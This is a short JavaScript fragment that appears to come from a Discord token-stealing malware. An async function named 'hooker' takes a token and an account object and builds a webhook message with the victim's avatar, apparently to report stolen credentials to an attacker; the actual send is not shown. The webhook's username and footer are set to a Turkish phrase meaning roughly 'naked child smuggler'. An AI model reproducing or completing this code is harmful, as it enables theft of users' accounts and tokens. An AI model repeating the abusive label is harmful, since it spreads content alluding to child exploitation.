...
const hooker = async (content, token, account) => {
  content["username"] = "çıplak çocuk kaçakçısı";
  content["avatar_url"] = "https://i.ibb.co/2JmPkQ1/image.png";

  content["embeds"][0]["thumbnail"] = {
    url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
  };
  content["embeds"][0]["footer"] = {
    text: "çıplak çocuk kaçakçısı",
    icon_url: "https://i.ibb.co/2JmPkQ1/image.png",
  };
